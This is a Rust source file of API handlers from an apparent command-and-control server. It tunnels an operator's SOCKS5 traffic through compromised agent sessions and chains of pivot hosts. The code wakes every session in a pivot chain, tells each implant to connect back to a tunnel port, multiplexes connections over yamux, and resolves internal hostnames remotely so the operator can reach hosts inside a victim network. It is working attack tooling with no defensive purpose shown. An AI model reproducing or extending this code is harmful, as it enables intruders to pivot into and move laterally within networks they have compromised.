use axum::{
    extract::{Path, State},
    http::StatusCode,
    response::{IntoResponse, Response},
    Json,
};
use std::sync::Arc;
use tokio::net::TcpListener;
use tokio::sync::oneshot;
use futures::prelude::*;
use tokio_util::compat::{TokioAsyncReadCompatExt, FuturesAsyncReadCompatExt};

use crate::api::state::{ApiContext, ProxyHandle};
use crate::api::models::{ProxyDto, IpWhoIsResponse, GeoIpResult};

pub async fn list_proxies(State(state): State<Arc<ApiContext>>) -> Json<Vec<ProxyDto>> {
    let proxies = state.proxies.lock().unwrap();
    let dtos = proxies.values().map(|p| ProxyDto {
        session_id: p.session_id,
        tunnel_port: p.tunnel_port,
        socks_port: p.socks_port,
    }).collect();
    Json(dtos)
}

pub async fn start_proxy(
    State(state): State<Arc<ApiContext>>,
    Path(id): Path<u32>,
) -> Response {
    // [NEW] Auto-Tune: Recursively set sleep to 0 for the target session AND its parents (the tunnel chain)
    // This prevents the SOCKS connection from hanging due to sleep latency at the middle hops.
    {
        let sessions = state.sessions.lock().unwrap();
        let mut current_node = Some(id);
        let mut chain_log = Vec::new();

        eprintln!("[Proxy] Starting Auto-Tune for Session #{}...", id);

        while let Some(curr_id) = current_node {
            if let Some(sess) = sessions.get(&curr_id) {
                // Send "sleep 0 0" to force interactive mode
                // We ignore send errors (e.g. if a specific node is momentarily unreachable)
                let _ = sess.tx.send(("sleep 0 0".to_string(), None));
                chain_log.push(curr_id);
                
                // Traverse up to the parent (hop backwards towards C2)
                current_node = sess.parent_id;
            } else {
                break;
            }
        }
        
        if !chain_log.is_empty() {
            eprintln!("[Auto-Tune] Woke up pivot chain: {:?}", chain_log);
        }
    }

    let session_tx = {
        let sessions = state.sessions.lock().unwrap();
        match sessions.get(&id) {
            Some(s) => s.tx.clone(),
            None => return (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Session not found"}))).into_response(),
        }
    };

    {
        let proxies = state.proxies.lock().unwrap();
        if proxies.contains_key(&id) {
            return (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": "Proxy already active"}))).into_response();
        }
    }

    // Bind Ports (0 means let OS pick a random open port)
    let tunnel_listener = match TcpListener::bind("0.0.0.0:0").await {
        Ok(l) => l,
        Err(e) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": e.to_string()}))).into_response(),
    };
    let socks_listener = match TcpListener::bind("127.0.0.1:0").await {
        Ok(l) => l,
        Err(e) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": e.to_string()}))).into_response(),
    };

    let tunnel_port = tunnel_listener.local_addr().unwrap().port();
    let socks_port = socks_listener.local_addr().unwrap().port();
    let (stop_tx, mut stop_rx) = oneshot::channel::<()>();

    {
        let mut proxies = state.proxies.lock().unwrap();
        proxies.insert(id, ProxyHandle { session_id: id, tunnel_port, socks_port, stop_tx });
    }

    // Tell the client to connect back to our tunnel port
    let _ = session_tx.send((format!("proxy:start {}", tunnel_port), None));
    let proxies_clone = state.proxies.clone();
    
    // Spawn the proxy bridge task
    tokio::spawn(async move {
        eprintln!("[Proxy] Started for Session {} (Tunnel: {}, SOCKS: {})", id, tunnel_port, socks_port);
        
        // Wait for the client to connect to the tunnel port OR a stop signal
        let (stream, _) = tokio::select! {
            res = tunnel_listener.accept() => match res { Ok(r) => r, Err(_) => return },
            _ = &mut stop_rx => return,
        };

        // Initialize Yamux Multiplexer
        let stream = Box::pin(TokioAsyncReadCompatExt::compat(stream));
        let connection = yamux::Connection::new(stream, yamux::Config::default(), yamux::Mode::Server);
        let control = connection.control();
        let runner = yamux::into_stream(connection);
        tokio::pin!(runner);

        loop {
            tokio::select! {
                // Keep the multiplexer running
                _ = runner.next() => break,
                
                // Accept incoming SOCKS5 connections from the operator (You)
                res = socks_listener.accept() => {
                    if let Ok((user_sock, _)) = res {
                        let mut ctrl = control.clone();
                        tokio::spawn(async move {
                            // Open a new stream inside the tunnel for this SOCKS connection
                            if let Ok(tun) = ctrl.open_stream().await {
                                let (mut ri, mut wi) = tokio::io::split(user_sock);
                                let (mut ro, mut wo) = tokio::io::split(FuturesAsyncReadCompatExt::compat(tun));
                                // Pipe data bi-directionally
                                let _ = tokio::try_join!(tokio::io::copy(&mut ri, &mut wo), tokio::io::copy(&mut ro, &mut wi));
                            }
                        });
                    }
                }
                // Handle manual stop
                _ = &mut stop_rx => break,
            }
        }
        proxies_clone.lock().unwrap().remove(&id);
        eprintln!("[Proxy] Stopped for Session {}", id);
    });

    (StatusCode::OK, Json(serde_json::json!({
        "status": "started",
        "tunnel_port": tunnel_port,
        "socks_port": socks_port
    }))).into_response()
}

pub async fn stop_proxy(
    State(state): State<Arc<ApiContext>>,
    Path(id): Path<u32>,
) -> Response {
    let mut proxies = state.proxies.lock().unwrap();
    if let Some(handle) = proxies.remove(&id) {
        let _ = handle.stop_tx.send(()); 
        if let Some(session) = state.sessions.lock().unwrap().get(&id) {
            let _ = session.tx.send(("proxy:stop".to_string(), None));
        }
        (StatusCode::OK, Json(serde_json::json!({"status": "stopped"}))).into_response()
    } else {
        (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "No active proxy for this session"}))).into_response()
    }
}

pub async fn check_proxy_ip(
    State(state): State<Arc<ApiContext>>,
    Path(id): Path<u32>,
) -> Response {
    let socks_port = {
        let proxies = state.proxies.lock().unwrap();
        match proxies.get(&id) {
            Some(p) => p.socks_port,
            None => return (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Proxy not found"}))).into_response(),
        }
    };

    let ip_result = tokio::task::spawn_blocking(move || {
        // [FIX] Use socks5h:// to force REMOTE DNS resolution.
        // If we use socks5://, the C2 server tries to resolve the domain.
        // If the domain is internal (e.g. intranet.corp), the C2 server won't find it.
        // socks5h:// sends the hostname to the target agent to resolve.
        let proxy_url = format!("socks5h://127.0.0.1:{}", socks_port); 
        
        let client = match reqwest::blocking::Client::builder()
            .proxy(reqwest::Proxy::all(&proxy_url).unwrap())
            .timeout(std::time::Duration::from_secs(15))
            .user_agent("SecureC2/1.0")
            .build() {
                Ok(c) => c,
                Err(e) => return Err(format!("Client Build Error: {}", e)),
            };

        match client.get("https://ipwho.is/").send() {
            Ok(resp) => {
                match resp.json::<IpWhoIsResponse>() {
                    Ok(info) => {
                        if !info.success { return Err("API returned success: false".to_string()); }
                        Ok(GeoIpResult {
                            ip: info.ip,
                            country: info.country,
                            country_code: info.country_code,
                            city: info.city,
                            isp: info.connection.isp,
                        })
                    },
                    Err(e) => Err(format!("JSON Parse Error: {}", e)),
                }
            },
            Err(e) => Err(format!("Unreachable: {}", e)),
        }
    }).await.unwrap_or(Err("Task Join Error".to_string()));

    match ip_result {
        Ok(info) => (StatusCode::OK, Json(info)).into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": e}))).into_response(),
    }
}
